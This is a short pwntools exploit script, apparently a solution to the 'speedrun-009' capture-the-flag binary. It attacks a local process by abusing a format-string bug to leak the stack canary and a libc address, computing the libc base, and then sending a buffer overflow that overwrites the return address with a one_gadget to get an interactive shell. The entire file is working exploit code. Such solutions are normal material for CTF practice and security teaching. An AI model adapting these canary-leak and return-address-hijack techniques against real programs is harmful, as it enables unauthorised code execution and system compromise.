#!/usr/bin/python 
from pwn import *

p = process("./speedrun-009")

def overflow(pay):
    p.sendafter("1, 2, or 3\n", '1')
    p.send(pay)

def fsb(a):
    p.sendafter("1, 2, or 3\n", '2')
    p.send(a)
    p.recvuntil("Is that it \"")

# canary leak
overflow('A'*(0x410-0x8))

fsb("%" + str((0xd0+0x410-0x8)/8+8) + '$p') 
canary = int(p.recv(18), 16)
log.info("canary : "+hex(canary))

gdb.attach(p)

# libc leak
overflow('A'*(0x410-0x8))
fsb("%" + str((0xd0+0x410-0x8)/8+8+6) + '$p')
libc_start_main_240 = int(p.recv(14), 16)
log.info("addr : "+hex(libc_start_main_240))
libcBase = libc_start_main_240-0x20830
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + 0x45216

overflow('A'*(0x410-0x8) + p64(canary) + 'A'*8 + p64(one_gadget))

p.interactive()
